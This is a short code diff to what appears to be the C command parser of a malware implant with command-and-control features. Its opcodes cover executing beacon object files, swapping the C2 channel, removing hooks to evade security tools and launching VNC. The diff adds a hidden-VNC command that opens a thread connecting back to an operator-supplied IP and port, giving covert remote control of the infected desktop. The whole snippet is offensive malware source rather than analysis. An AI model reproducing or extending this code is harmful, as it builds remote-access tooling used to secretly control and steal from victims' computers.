@@ -11,6 +11,7 @@
 #include "hackmods/bof.h"
 #include "hackmods/unhook.h"
 #include "vnc/vnc.h"
+#include "hvnc/hvnc.h"
 #define pstr(x) printf("len=%d, data=%.*s\n", x.len, x.len, x.data)
 #define fs(x) free(x.data)
 
@@ -32,7 +33,8 @@ enum Opcodes{
     BOF_EXECUTE, //1//bof_execute file([bof file])
     SWAP_C2, //?//swap_c2 [c2 method] ... [poll interval]
     UNHOOK, //0//auto remove hooks
-    VNC //2//vnc [ip] [port]
+    VNC, //2//vnc [ip] [port]
+    HVNC, //2//hvnc [ip] [port]
 };
 
 int parse(int mnem, unsigned char** sp, unsigned int* rax, C2* conn){
@@ -99,6 +101,12 @@ int parse(int mnem, unsigned char** sp, unsigned int* rax, C2* conn){
         net->ip = data.data;
         net->port = popint(sp);
         CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)vncspawn, net, 0, NULL);
+    }else if(mnem == HVNC){
+        String data = popstr(sp);
+        NETWORK* net = calloc(sizeof(NETWORK), 1);
+        net->ip = data.data;
+        net->port = popint(sp);
+        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)hvnc, net, 0, NULL);
     }else{
         return 1;
     }
